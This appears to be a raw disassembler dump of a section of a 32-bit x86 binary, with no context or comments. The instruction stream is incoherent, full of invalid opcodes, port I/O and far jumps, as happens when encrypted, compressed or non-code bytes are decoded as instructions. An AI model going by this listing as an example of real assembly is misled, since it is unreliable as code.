  4107de:	mov    ch,0xd9
  4107e0:	jns    0x410813
  4107e2:	jp     0x41081c
  4107e4:	adc    eax,0xaecf5d36
  4107e9:	neg    DWORD PTR [eax+0x40]
  4107ec:	push   esi
  4107ed:	xchg   ecx,eax
  4107ee:	xor    al,0xc5
  4107f0:	outs   dx,DWORD PTR ds:[esi]
  4107f1:	mov    ds:0xfdc1a67,eax
  4107f6:	pop    edi
  4107f7:	outs   dx,DWORD PTR ds:[esi]
  4107f8:	mov    ebp,0x9e1370f8
  4107fd:	xor    dh,bh
  4107ff:	out    dx,eax
  410800:	add    DWORD PTR [edx+0x5b9d2202],esp
  410806:	fdivp  st(3),st
  410808:	push   edi
  410809:	mov    WORD PTR [eax],?
  41080b:	xor    ch,BYTE PTR ds:0x28256f04
  410811:	retf   0x7ac9
  410814:	inc    bh
  410816:	jnp    0x410820
  410818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410819:	js     0x4107e4
  41081b:	push   edi
  41081c:	mov    bl,0xe9
  41081e:	jp     0x41088f
  410820:	(bad)  
  410822:	iret   
  410823:	push   ss
  410824:	cmp    BYTE PTR [edi-0x3e],bh
  410827:	cmp    BYTE PTR [ebx+eiz*2],bh
  41082a:	xor    DWORD PTR [edi-0x6aea20b8],ebx
  410830:	xchg   edx,eax
  410831:	retf   
  410832:	addr16 loope 0x4107e1
  410835:	mov    dl,0x58
  410837:	das    
  410838:	out    dx,eax
  410839:	xchg   ebx,eax
  41083a:	adc    eax,0x6a0bd67f
  41083f:	mov    bh,0x5a
  410841:	dec    ebp
  410842:	mov    edx,0xfef870a6
  410847:	lea    esi,[edi]
  410849:	jae    0x410897
  41084b:	mov    eax,0xf1c9c108
  410850:	(bad)  
  410851:	out    0x99,al
  410853:	fcom   DWORD PTR [ecx]
  410855:	pop    esi
  410856:	xchg   edx,eax
  410857:	adc    edx,ebp
  410859:	shl    BYTE PTR [ecx-0x3a],0x10
  41085d:	push   ebx
  41085e:	fcomp  DWORD PTR [ebx+eax*2]
  410861:	sub    ch,BYTE PTR [esi+ecx*2+0x420fcb3f]
  410868:	xchg   edi,eax
  410869:	in     eax,0xa
  41086b:	sub    al,0x8c
  41086d:	mov    esi,ebx
  41086f:	xchg   esi,eax
  410870:	bound  eax,QWORD PTR [ebx+0x5f]
  410873:	and    BYTE PTR [edi-0x5],0x54
  410877:	adc    edi,ecx
  410879:	adc    eax,0x8d90ccd6
  41087e:	jo     0x41083c
  410880:	sahf   
  410881:	jae    0x410863
  410883:	xchg   esi,eax
  410884:	xor    DWORD PTR [eax+ecx*8-0x54ee5484],edi
  41088b:	fmul   st,st(2)
  41088d:	push   ecx
  41088e:	sar    DWORD PTR [ebx+0x61],cl
  410891:	pop    esi
  410892:	cli    
  410893:	xor    BYTE PTR [ebx-0x4a],dl
  410896:	push   ebp
  410897:	add    ebp,ebp
  410899:	aam    0xf3
  41089b:	dec    esp
  41089c:	icebp  
  41089d:	test   DWORD PTR [ebp-0x54],eax
  4108a0:	jmp    0x2b3d:0xd6fd3d23
  4108a7:	loope  0x41088f
  4108a9:	daa    
  4108aa:	mov    ah,0x31
  4108ac:	jae    0x4108e6
  4108ae:	arpl   WORD PTR [esi],sp
  4108b0:	fild   QWORD PTR [edi+0x6d841d5c]
  4108b6:	dec    edx
  4108b7:	inc    edi
  4108b8:	fild   WORD PTR [edi+ebx*2+0x30488170]
  4108bf:	sbb    eax,0xb1eaa202
  4108c4:	sub    al,0x98
  4108c6:	xchg   DWORD PTR [ecx],ecx
  4108c8:	mov    ch,0x66
  4108ca:	fld    TBYTE PTR [ecx-0x9d9962d]
  4108d0:	(bad)  
  4108d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108d3:	adc    ecx,DWORD PTR [esi-0x78c77047]
  4108d9:	lods   al,BYTE PTR ds:[esi]
  4108da:	mov    esi,0xd783cbd5
  4108df:	in     al,0xde
  4108e1:	cmp    edi,eax
  4108e3:	jecxz  0x4108dc
  4108e5:	scas   al,BYTE PTR es:[edi]
  4108e6:	scas   al,BYTE PTR es:[edi]
  4108e7:	sbb    BYTE PTR [ebp-0x3690a1d7],0xd4
  4108ee:	inc    ebp
  4108ef:	es xchg ecx,eax
  4108f1:	ret    
  4108f2:	xchg   BYTE PTR [eax+0x20],ch
  4108f5:	pushf  
  4108f6:	jbe    0x4108cf
  4108f8:	fsubr  QWORD PTR [esi+ecx*8+0x3]
  4108fc:	lods   al,BYTE PTR ds:[esi]
  4108fd:	or     eax,0x9b1df9c1
  410902:	in     al,dx
  410903:	es mov ah,0x3f
  410906:	hlt    
  410907:	xor    bh,BYTE PTR [ebp-0x6e]
  41090a:	nop
  41090b:	or     al,0xda
  41090d:	dec    edx
  41090e:	add    DWORD PTR cs:[edx+0x55],edi
  410912:	icebp  
  410913:	xchg   ecx,eax
  410914:	imul   edx,DWORD PTR ds:0xfd861b7d,0xffffffe4
  41091b:	mov    esp,0xc84645e7
  410920:	hlt    
  410921:	cs dec ebp
  410923:	in     al,0xe4
  410925:	xlat   BYTE PTR ds:[ebx]
  410926:	push   cs
  410927:	sar    DWORD PTR [eax+0x643e2bf0],1
  41092d:	fwait
  41092e:	inc    esp
  41092f:	aas    
  410930:	or     DWORD PTR [edx-0xf],edx
  410933:	jg     0x4108eb
  410935:	imul   ebp
  410937:	std    
  410938:	xor    al,0xfc
  41093a:	sbb    al,0x42
  41093c:	jns    0x410924
  41093e:	sub    ch,ch
  410940:	lods   eax,DWORD PTR ds:[esi]
  410941:	mov    al,ds:0xb1dc0507
  410946:	sub    al,0x2
  410948:	mov    BYTE PTR [edx+0x41],ch
  41094b:	cmp    al,BYTE PTR [ebx+esi*2-0x77]
  41094f:	loopne 0x41096a
  410951:	pop    esi
  410952:	push   es
  410953:	aam    0x4b
  410955:	lds    edi,FWORD PTR [edi]
  410957:	mov    bl,0x41
  410959:	popf   
  41095a:	loopne 0x410990
  41095c:	pushf  
  41095d:	test   al,0xf3
  41095f:	std    
  410960:	mov    bl,BYTE PTR [esi-0x16bb76d2]
  410966:	leave  
  410967:	mov    ds:0xf8d686b9,al
  41096c:	stos   DWORD PTR es:[edi],eax
  41096d:	sbb    al,0x7
  41096f:	mov    esi,eax
  410971:	prefetch (bad)
  410972:	or     eax,0xb0fbf5fa
  410977:	sub    DWORD PTR [ebp+0x6],eax
  41097a:	xor    ecx,edx
  41097c:	out    0x53,eax
  41097e:	in     al,dx
  41097f:	mov    ds:0x21dffe6f,al
  410984:	in     al,0x96
  410986:	aaa    
  410987:	fiadd  DWORD PTR [ebx-0xca2ac3b]
  41098d:	pop    ds
  41098e:	mov    eax,ds:0x23522f25
  410993:	adc    eax,0x9ecc7f71
  410998:	cli    
  410999:	mov    eax,ds:0xb7c8e386
  41099e:	push   edx
  41099f:	pop    edi
  4109a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109a1:	aas    
  4109a2:	(bad)  
  4109a3:	out    0x5c,al
  4109a5:	sbb    ah,bl
  4109a7:	jmp    0x75bd:0x1319b806
  4109ae:	adc    ecx,edx
  4109b0:	add    BYTE PTR [edx],0x9
  4109b3:	ret    0x31bf
  4109b6:	in     al,0x9a
  4109b8:	xrelease mov DWORD PTR [edx-0x74aff75b],eax
  4109bf:	push   esp
  4109c0:	dec    esp
  4109c1:	pop    edx
  4109c2:	stc    
  4109c3:	mov    dh,0x48
  4109c5:	aaa    
  4109c6:	or     eax,0x6cfc494a
  4109cb:	pop    ebp
  4109cc:	push   esi
  4109cd:	mov    ss,WORD PTR [edi-0xb]
  4109d0:	add    DWORD PTR [eax],ecx
  4109d2:	rcl    ah,0x95
  4109d5:	sti    
  4109d6:	cmc    
  4109d7:	in     al,0x40
  4109d9:	fs or  esi,ebx
  4109dc:	ffreep st(2)
  4109de:	mov    edi,0x9c4fa796
  4109e3:	aad    0x25
  4109e5:	aas    
  4109e6:	xchg   ecx,eax
  4109e7:	pop    ebp
  4109e8:	repnz add esp,eax
  4109eb:	and    DWORD PTR [eax*1+0x6f5ee05e],ebp
  4109f2:	xchg   edx,eax
  4109f3:	adc    eax,0x41245b7c
  4109f8:	pop    esp
  4109f9:	inc    esi
  4109fa:	aas    
  4109fb:	xor    al,0x6
  4109fd:	lahf   
  4109fe:	inc    edx
  4109ff:	or     eax,0x7f0f496a
  410a04:	sbb    eax,0x3edb32de
  410a09:	in     eax,0x50
  410a0b:	pop    es
  410a0c:	mov    edi,0xb7b36148
  410a11:	mov    edi,ds
  410a13:	pusha  
  410a14:	mov    eax,ds:0x1cf43258
  410a19:	dec    ebp
  410a1a:	mov    bh,0x87
  410a1c:	jb     0x410a0d
  410a1e:	or     esp,edx
  410a20:	lea    edx,[edx]
  410a22:	aas    
  410a23:	loop   0x410a90
  410a25:	(bad)  
  410a26:	icebp  
  410a27:	loop   0x410a74
  410a29:	test   BYTE PTR [ecx-0x4e],cl
  410a2c:	int3   
  410a2d:	fnstcw WORD PTR cs:[eax]
  410a30:	or     eax,0x39f9b07b
  410a35:	loope  0x410a57
  410a37:	xchg   ebp,eax
  410a38:	stos   DWORD PTR es:[edi],eax
  410a39:	test   al,0x2c
  410a3b:	inc    esp
  410a3c:	sub    al,0xd9
  410a3e:	je     0x410aba
  410a40:	xor    BYTE PTR [edx+0x61a2bedc],dh
  410a46:	or     DWORD PTR [ebx+0x16],ebp
  410a49:	ds jecxz 0x4109d2
  410a4c:	fcom   DWORD PTR [ebx*2-0x4dee9125]
  410a53:	adc    esp,DWORD PTR [edi-0x10]
  410a56:	fstp   QWORD PTR [eax]
  410a58:	inc    ebx
  410a59:	sbb    BYTE PTR [eax],bl
  410a5b:	adc    dl,BYTE PTR [eax+0x16]
  410a5e:	jae    0x410a52
  410a60:	jmp    0xd56efdc5
  410a65:	push   eax
  410a66:	jl     0x410a97
  410a68:	stc    
  410a69:	lea    ebp,[eax-0x39]
  410a6c:	xor    edi,ecx
  410a6e:	jmp    0x410a6e
  410a70:	fwait
  410a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a72:	xchg   esi,eax
  410a73:	jecxz  0x410a46
  410a75:	pop    esp
  410a76:	fldenv [eax+edi*4+0x2b]
  410a7a:	mov    ecx,0x4cf05383
  410a7f:	or     edi,0xffffff81
  410a82:	pop    edi
  410a83:	xlat   BYTE PTR ds:[ebx]
  410a84:	xor    edx,DWORD PTR [edx+edx*8-0x35]
  410a88:	dec    ebx
  410a89:	(bad)  
  410a8a:	mov    esp,0x59e491f1
  410a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a90:	pop    ds
  410a91:	or     al,0xfb
  410a93:	out    0xee,al
  410a95:	shl    ebx,0xe8
  410a98:	add    eax,esi
  410a9a:	push   ebp
  410a9b:	icebp  
  410a9c:	jbe    0x410a1f
  410a9e:	dec    esp
  410a9f:	mov    ch,0xb5
  410aa1:	or     DWORD PTR [edx-0x1a],esp
  410aa4:	icebp  
  410aa5:	rcl    BYTE PTR [edx+eax*1-0x41],1
  410aa9:	sbb    bl,cl
  410aab:	not    DWORD PTR [edi]
  410aad:	scas   eax,DWORD PTR es:[edi]
  410aae:	adc    DWORD PTR [eax],0xe
  410ab1:	loop   0x410a65
  410ab3:	lock jns 0x410adc
  410ab6:	sahf   
  410ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ab8:	cs jns 0x410a8d
  410abb:	mov    WORD PTR [edi+0x3d05025e],?
  410ac1:	(bad)  
  410ac2:	push   ebx
  410ac3:	shl    DWORD PTR [edi],1
  410ac5:	jo     0x410a89
  410ac7:	lods   eax,DWORD PTR ds:[esi]
  410ac8:	jno    0x410aaf
  410aca:	(bad)  
  410acb:	mov    dl,0x9f
  410acd:	outs   dx,DWORD PTR ds:[esi]
  410ace:	or     al,0x7f
  410ad0:	mov    al,ds:0x3aac7ef2
  410ad5:	mov    dh,0x74
  410ad7:	cli    
  410ad8:	cmp    al,dh
  410ada:	jno    0x410a7c
  410adc:	pop    ecx
  410add:	das    
  410ade:	pop    ebp
  410adf:	sar    BYTE PTR ds:0x2b3ae19b,1
  410ae5:	inc    ebx
  410ae6:	mov    bh,ah
  410ae8:	cmp    DWORD PTR [edi],ebp
  410aea:	sbb    BYTE PTR [edx-0x7cfb5f0b],0xf6
  410af1:	std    
  410af2:	dec    esp
  410af3:	cmp    ebp,ebp
  410af5:	leave  
  410af6:	pop    edx
  410af7:	cmp    BYTE PTR ds:0x5cfe0c9e,0x53
  410afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aff:	test   al,0xae
  410b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b02:	lahf   
  410b03:	sahf   
  410b04:	in     al,0xf3
  410b06:	mov    bl,0x0
  410b08:	xchg   ebx,eax
  410b09:	pop    esi
  410b0a:	addr16 pop es
  410b0c:	mov    ss:0x22e1a067,eax
  410b12:	hlt    
  410b13:	test   BYTE PTR [esi+0x3f293d82],0x81
  410b1a:	xor    ah,BYTE PTR ds:0x2a1ac98f
  410b20:	jae    0x410b31
  410b22:	out    dx,eax
  410b23:	in     al,0x33
  410b25:	xchg   ebx,eax
  410b26:	pop    edx
  410b27:	jae    0x410aed
  410b29:	and    dh,BYTE PTR [esp+eax*8-0x5c]
  410b2d:	adc    edi,DWORD PTR [esi-0x30]
  410b30:	fbstp  TBYTE PTR [edx+0x4e5f7b06]
  410b36:	dec    esi
  410b37:	in     al,dx
  410b38:	push   es
  410b39:	sbb    eax,DWORD PTR [ecx+0x30]
  410b3c:	cmp    DWORD PTR [edi-0x6a6455b],ebp
  410b42:	add    BYTE PTR [ebx+0x26f8e4b4],ch
  410b48:	(bad)  
  410b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b4a:	sar    DWORD PTR [ecx+ecx*4],0x2c
  410b4e:	jns    0x410ae9
  410b50:	or     bl,ch
  410b52:	pop    edx
  410b53:	add    cl,dl
  410b55:	adc    al,bh
  410b57:	cwde   
  410b58:	mov    esp,0xf8d1fd5d
  410b5d:	retf   
  410b5e:	add    al,0x38
  410b60:	fadd   DWORD PTR [bp+di]
  410b63:	adc    ch,BYTE PTR ds:[esi+0x5]
  410b67:	xchg   esi,eax
  410b68:	and    BYTE PTR [eax+0x34312a49],bl
  410b6e:	dec    esp
  410b6f:	pop    edx
  410b70:	or     esp,eax
  410b72:	jo     0x410b5b
  410b74:	inc    edi
  410b75:	sbb    eax,0x149898d2
  410b7a:	jmp    0x75ba:0xed7f46f8
  410b81:	xor    eax,0xe32f88f8
  410b86:	mov    esi,0x30096e7e
  410b8b:	jl     0x410b96
  410b8d:	ins    BYTE PTR es:[edi],dx
  410b8e:	or     ch,dh
  410b90:	popf   
  410b91:	push   es
  410b92:	push   edi
  410b93:	mov    dh,0x98
  410b95:	mov    DWORD PTR [eax],ebp
  410b97:	aaa    
  410b98:	in     eax,dx
  410b99:	rol    DWORD PTR [edx+edi*2-0x6c],0xba
  410b9e:	stos   DWORD PTR es:[edi],eax
  410b9f:	xor    ebx,esp
  410ba1:	or     ebp,0xffffffa7
  410ba4:	call   0x4de9:0xa635a1cf
  410bab:	iret   
  410bac:	sub    BYTE PTR [ebp-0x5f091ed6],bl
  410bb2:	inc    eax
  410bb3:	(bad)  
  410bb4:	sbb    ebp,esi
  410bb6:	or     al,0x0
  410bb8:	in     eax,dx
  410bb9:	popa   
  410bba:	xchg   ecx,eax
  410bbb:	or     ebp,ebp
  410bbd:	ror    BYTE PTR [ebp-0x1879867f],1
  410bc3:	mov    ebp,0xb0ffa1bd
  410bc8:	mov    ?,WORD PTR ds:0x204b84a0
  410bce:	adc    ecx,DWORD PTR [edi-0x3fcc295a]
  410bd4:	out    dx,eax
  410bd5:	fild   DWORD PTR [ebx]
  410bd7:	rcr    BYTE PTR [ebx-0x64],0x68
  410bdb:	or     BYTE PTR gs:[ebx+eiz*8],0x4c
  410be0:	cmp    ah,0xc3
  410be3:	les    esp,FWORD PTR [ecx]
  410be5:	lea    eax,[ecx]
  410be7:	inc    esp
  410be8:	cmp    eax,0x1f3cdc61
  410bed:	and    bh,BYTE PTR [edi]
  410bef:	into   
  410bf0:	mov    WORD PTR [edx+0x8],ds
  410bf3:	pop    es
  410bf4:	or     DWORD PTR [eax+0x28],edx
  410bf7:	sbb    esp,ebx
  410bf9:	lea    ecx,[esi-0x7861043b]
  410bff:	lds    esp,FWORD PTR [edi-0x1db9021c]
  410c05:	or     DWORD PTR [edx-0xb0f6288],esi
  410c0b:	imul   edi,DWORD PTR [esi+0x7f064f2a],0x80206353
  410c15:	sar    edi,cl
  410c17:	aaa    
  410c18:	mov    ebx,DWORD PTR [ebx]
  410c1a:	dec    ebx
  410c1b:	(bad)  
  410c1c:	mov    cl,0x5
  410c1e:	mov    ds:0x378f2829,al
  410c23:	neg    DWORD PTR [esi]
  410c25:	add    eax,0xabb6ed51
  410c2a:	sbb    BYTE PTR [esi],ch
  410c2c:	xchg   DWORD PTR ds:0x102eab8a,esp
  410c32:	mov    edi,ebx
  410c34:	inc    eax
  410c35:	mov    dh,0x0
  410c37:	jl     0x410c1a
  410c39:	cmp    DWORD PTR [edx+0x366ff2f1],0x34
  410c40:	jp     0x410ca8
  410c42:	(bad)  [edi]
  410c44:	scas   al,BYTE PTR es:[edi]
  410c45:	retf   
  410c46:	leave  
  410c47:	maxps  xmm4,XMMWORD PTR [ecx+eiz*2]
  410c4b:	jecxz  0x410c52
  410c4d:	add    ah,ch
  410c4f:	fst    DWORD PTR [edi+0x6]
  410c52:	push   eax
  410c53:	fwait
  410c54:	jo     0x410cd1
  410c56:	adc    al,cl
  410c58:	pop    edi
  410c59:	outs   dx,DWORD PTR ds:[esi]
  410c5a:	retf   0x2dd0
  410c5d:	sub    al,0x23
  410c5f:	push   edx
  410c60:	shl    DWORD PTR [eax],cl
  410c62:	mov    ebp,0xb2257d4b
  410c67:	(bad)  
  410c68:	pmaxsw mm7,QWORD PTR [ebx-0x6e97b955]
  410c6f:	outs   dx,DWORD PTR ds:[esi]
  410c70:	sbb    edx,DWORD PTR [ecx+0x5]
  410c73:	sar    DWORD PTR [ebp+0x72fadf3a],cl
  410c79:	xchg   ebx,eax
  410c7a:	test   bh,ah
  410c7c:	adc    DWORD PTR [eax],edx
  410c7e:	xor    eax,0x2ea162db
  410c83:	mov    al,0xf8
  410c85:	daa    
  410c86:	jecxz  0x410c5c
  410c88:	fsubr  QWORD PTR [eax]
  410c8a:	fs jmp 0x82fb7b2c
  410c90:	xchg   esp,eax
  410c91:	les    ecx,FWORD PTR [ebp+0x2fdf8046]
  410c97:	xor    al,0xf5
  410c99:	mov    eax,0x915a36e9
  410c9e:	sub    edx,DWORD PTR [ebp+ebp*2-0x124e0f8]
  410ca5:	push   esp
  410ca6:	jnp    0x410d20
  410ca8:	or     al,0x6a
  410caa:	fdivrp st(0),st
  410cac:	fisttp DWORD PTR [ebp+0x7d37c20b]
  410cb2:	mov    bl,0x69
  410cb4:	shl    DWORD PTR [di+0xa],1
  410cb8:	int    0x35
  410cba:	adc    DWORD PTR [esi-0x54fb72fe],esi
  410cc0:	mov    al,0xf7
  410cc2:	push   0x4b431af2
  410cc7:	jl     0x410d16
  410cc9:	push   cs
  410cca:	adc    DWORD PTR [edx+0x0],edx
  410ccd:	jmp    0xdacd:0xa0d682f2
  410cd4:	lods   eax,DWORD PTR ds:[esi]
  410cd5:	shr    dh,0x4b
  410cd8:	cmp    DWORD PTR [ecx+0x4b],eax
  410cdb:	mov    ch,0xf9
  410cdd:	add    al,bl
  410cdf:	sub    DWORD PTR [eax+0x66],esp
  410ce2:	xchg   ebx,eax
  410ce3:	mov    cl,0x4b
  410ce5:	test   al,0x5e
  410ce7:	nop
  410ce8:	aas    
  410ce9:	pop    ebx
  410cea:	xor    BYTE PTR [eax],0x47
  410ced:	addr16 push ss
  410cef:	imul   edx,DWORD PTR [esi+0x4923c1f2],0x61
  410cf6:	sbb    BYTE PTR [esi+ebp*2-0x10],0x22
  410cfb:	ret    0x2bbb
  410cfe:	shr    DWORD PTR [eax+0x22],0x45
  410d02:	pop    eax
  410d03:	mov    ds:0x5e6c5aa7,eax
  410d08:	test   eax,0x71867e25
  410d0d:	sbb    BYTE PTR [edi+eiz*2],bl
  410d10:	fadd   st(1),st
  410d12:	xchg   ebp,eax
  410d13:	addr16 or ah,dl
  410d16:	dec    esi
  410d17:	bound  edi,QWORD PTR [esi+0x72]
  410d1a:	sbb    ebx,eax
  410d1c:	fsubr  st,st(5)
  410d1e:	push   ds
  410d1f:	mov    dh,0xb6
  410d21:	adc    bl,BYTE PTR [edi-0x4e3de9a6]
  410d27:	or     DWORD PTR [edx*8-0x4c69dca2],esp
  410d2e:	mov    ds:0x110c60a2,al
  410d33:	add    BYTE PTR [esi+eax*2],bh
  410d36:	popa   
  410d37:	jmp    0xa212d0a8
  410d3c:	and    al,BYTE PTR cs:[ecx]
  410d3f:	push   edx
  410d40:	or     esi,DWORD PTR [esi]
  410d42:	ss inc ecx
  410d44:	mov    eax,0x6ab8aca3
  410d49:	mov    bh,0x71
  410d4b:	push   esp
  410d4c:	pop    edi
  410d4d:	outs   dx,DWORD PTR ds:[esi]
  410d4e:	jnp    0x410d8a
  410d50:	dec    eax
  410d51:	pop    eax
  410d52:	and    al,0x92
  410d54:	pop    eax
  410d55:	mov    ds:0x1d0b6e0d,al
  410d5a:	inc    esi
  410d5b:	pop    ebx
  410d5c:	jge    0x410cef
  410d5e:	pop    ecx
  410d5f:	(bad)  
  410d60:	or     eax,0x3deea60f
  410d65:	mov    edi,0x62198b5b
  410d6a:	(bad)  
  410d6b:	enter  0x9e4f,0xa
  410d6f:	clc    
  410d70:	sbb    eax,0x289f2ef1
  410d75:	call   0xc9e7d3e8
  410d7a:	das    
  410d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d7c:	xor    ebx,DWORD PTR [ebx-0x68f722d7]
  410d82:	jo     0x410d99
  410d84:	add    ecx,DWORD PTR [ebp+edx*4+0x4f7e7fd3]
  410d8b:	shl    eax,1
  410d8d:	shl    BYTE PTR [esi+ecx*1],0xee
  410d91:	std    
  410d92:	adc    dl,al
  410d94:	pop    es
  410d95:	shl    ebp,1
  410d97:	ret    
  410d98:	adc    al,0x11
  410d9a:	shr    BYTE PTR [esi+0x7bc237d1],cl
  410da0:	sub    ebp,DWORD PTR [ebp-0x3ef1ff0c]
  410da6:	push   ecx
  410da7:	add    al,0x7c
  410da9:	jmp    0xd43eea20
  410dae:	inc    edi
  410daf:	gs adc al,0xfc
  410db2:	sub    al,0xe5
  410db4:	test   BYTE PTR [edx+0x3b],0x84
  410db8:	icebp  
  410db9:	mov    esi,0x142575ed
  410dbe:	int3   
  410dbf:	out    dx,eax
  410dc0:	add    DWORD PTR ds:0xae3b2163,esp
  410dc6:	das    
  410dc7:	adc    BYTE PTR [esi-0x61],dh
  410dca:	add    eax,0x11f00d31
  410dcf:	pop    edx
  410dd0:	sbb    DWORD PTR [ebp-0x664cd98],ebp
  410dd6:	pop    es
  410dd7:	fsub   st,st(7)
  410dd9:	or     DWORD PTR [edi-0x1],edx
  410ddc:	ficomp WORD PTR [edx]
  410dde:	pop    ebx
  410ddf:	xor    BYTE PTR [ecx+edx*1],bh
  410de2:	mov    esp,0xe4f9d0f3
  410de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410de8:	xchg   ebx,eax
  410de9:	add    BYTE PTR [ebp-0x31787608],cl
  410def:	mov    bh,ah
  410df1:	adc    eax,0x349a03a2
  410df6:	jb     0x410e3d
  410df8:	add    eax,0x6c815bc1
  410dfd:	cmp    DWORD PTR [eax],eax
  410dff:	in     al,dx
  410e00:	nop
  410e01:	mov    dh,BYTE PTR [ebx]
  410e03:	lods   eax,DWORD PTR ds:[esi]
  410e04:	xor    DWORD PTR [eax],0xffffffd9
  410e07:	(bad)  
  410e08:	scas   eax,DWORD PTR es:[edi]
  410e09:	fs pop edi
  410e0b:	fstp   DWORD PTR [esi]
  410e0d:	sbb    DWORD PTR [eax],0xc7de6359
  410e13:	sbb    eax,0x94da0824
  410e18:	rdpmc  
  410e1a:	pop    ecx
  410e1b:	int3   
  410e1c:	mov    al,0x9f
  410e1e:	inc    eax
  410e1f:	cmp    al,0xd5
  410e21:	fisubr WORD PTR [ebp+0x34]
  410e24:	popa   
  410e25:	fdiv   QWORD PTR [ebx]
  410e27:	jno    0x410e5b
  410e29:	mov    ebx,0xfece54aa
  410e2e:	stos   BYTE PTR es:[edi],al
  410e2f:	fild   WORD PTR [esi]
  410e31:	cmp    edi,ebx
  410e33:	iret   
  410e34:	pop    edi
  410e35:	cmp    eax,0x68ade46b
  410e3a:	mov    ebx,0xdbd83f05
  410e3f:	jmp    0x6d70097d
  410e44:	mov    ebp,0x7c739e40
  410e49:	jecxz  0x410dcc
  410e4b:	shl    DWORD PTR [ebp+0x193ab2c3],1
  410e51:	leave  
  410e52:	jnp    0x410def
  410e54:	neg    BYTE PTR [esi-0x6f]
  410e57:	jnp    0x410e6f
  410e59:	inc    ecx
  410e5a:	add    ah,cl
  410e5c:	mov    esi,0x1f8402ff
  410e61:	mov    esi,0x83b28370
  410e66:	push   edi
  410e67:	cmp    al,0xc7
  410e69:	sub    eax,0xff7eab51
  410e6e:	add    al,0x8b
  410e70:	push   0x7f3eb627
  410e75:	pushf  
  410e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e77:	xchg   ecx,eax
  410e78:	xchg   BYTE PTR [eax-0x6d39710b],dh
  410e7e:	stc    
  410e7f:	mov    bl,BYTE PTR cs:[eax-0x6d]
  410e83:	test   BYTE PTR [edx+0x1dc2e956],dh
  410e89:	aaa    
  410e8a:	adc    cl,BYTE PTR [edi]
  410e8c:	ret    0x10d3
  410e8f:	sbb    dh,BYTE PTR [eax]
  410e91:	cwde   
  410e92:	inc    ecx
  410e93:	adc    BYTE PTR [eax+0x49],dh
  410e96:	xor    esp,DWORD PTR [esp+ecx*4+0x49]
  410e9a:	xor    ecx,DWORD PTR [ebp-0x3828dc3a]
  410ea0:	dec    eax
  410ea1:	fadd   QWORD PTR [edi+esi*4-0x438b9d1d]
  410ea8:	(bad)  
  410ea9:	mov    edi,0x732ceeed
  410eae:	mov    ecx,0xb8c1aabf
  410eb3:	and    eax,ebp
  410eb5:	push   ebp
  410eb6:	jmp    FWORD PTR [esi+0x34]
  410eb9:	fisub  DWORD PTR [edi+0x10]
  410ebc:	adc    ah,bh
  410ebe:	lds    esi,FWORD PTR [edx+0x78]
  410ec1:	dec    edx
  410ec2:	adc    eax,0x579eed9e
  410ec7:	call   0xf3cc944a
  410ecc:	leave  
  410ecd:	out    0x8c,eax
  410ecf:	mov    ebp,gs
  410ed1:	jnp    0x410f32
  410ed3:	cmp    ah,al
  410ed5:	popf   
  410ed6:	fiadd  WORD PTR [ecx]
  410ed8:	jmp    0x410f17
  410eda:	pop    ebx
  410edb:	mov    ah,0xad
  410edd:	sbb    DWORD PTR [edi+0x4981dc25],ecx
  410ee3:	pop    edi
  410ee4:	mov    cl,0x7e
  410ee6:	ins    BYTE PTR es:[edi],dx
  410ee7:	data16 jno 0x410e8d
  410eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eeb:	jmp    0x5a63da51
  410ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ef1:	ins    BYTE PTR es:[edi],dx
  410ef2:	das    
  410ef3:	jg     0x410f48
  410ef5:	xchg   ebp,eax
  410ef6:	ret    
  410ef7:	fwait
  410ef8:	sti    
  410ef9:	stos   DWORD PTR es:[edi],eax
  410efa:	out    dx,al
  410efb:	cmp    DWORD PTR [esi+0x26c89a9e],0xe48dd4c
  410f05:	jns    0x410e91
  410f07:	or     al,BYTE PTR [ebx+edi*8]
  410f0a:	fimul  WORD PTR [edx]
  410f0c:	fld    QWORD PTR [edi+0x19]
  410f0f:	mov    cl,0x5f
  410f11:	retf   0xf8ee
  410f14:	push   ebp
  410f15:	cli    
  410f16:	and    al,0xcd
  410f18:	stos   DWORD PTR es:[edi],eax
  410f19:	outs   dx,BYTE PTR ds:[esi]
  410f1a:	mov    edi,DWORD PTR [edx]
  410f1c:	in     eax,dx
  410f1d:	cmp    ebx,0x37f16e83
  410f23:	mov    bh,0xd0
  410f25:	mov    dh,0x41
  410f27:	rep stos BYTE PTR es:[edi],al
  410f29:	dec    esi
  410f2a:	jne    0x410f73
  410f2c:	jbe    0x410f57
  410f2e:	push   esp
  410f2f:	pop    ebp
  410f30:	fwait
  410f31:	mov    esp,0x1b38b7ec
  410f36:	pop    eax
  410f37:	sub    DWORD PTR [edx-0x155f566c],edi
  410f3d:	push   edx
  410f3e:	ins    DWORD PTR es:[edi],dx
  410f3f:	mov    bh,0xce
  410f41:	out    0xe0,al
  410f43:	sar    bl,0xee
  410f46:	hlt    
  410f47:	cmp    BYTE PTR ds:0x43efc706,bl
  410f4d:	mov    esi,DWORD PTR [ecx]
  410f4f:	jge    0x410f63
  410f51:	cmp    eax,0x1474ca09
  410f56:	push   0xffffff94
  410f58:	daa    
  410f59:	and    al,0xf3
  410f5b:	xchg   ecx,eax
  410f5c:	psadbw mm7,QWORD PTR [esp+edx*8+0x1e]
  410f61:	icebp  
  410f62:	push   es
  410f63:	xchg   esi,eax
  410f64:	addr16 out 0xbd,al
  410f67:	rcr    BYTE PTR [ebx],1
  410f69:	loopne 0x410ef9
  410f6b:	dec    esi
  410f6c:	std    
  410f6d:	mov    al,0x31
  410f6f:	jno    0x410ef7
  410f71:	xchg   esp,eax
  410f72:	add    BYTE PTR [edx-0x21d30280],0x21
  410f79:	xchg   esp,eax
  410f7a:	mov    bh,0x2f
  410f7c:	dec    eax
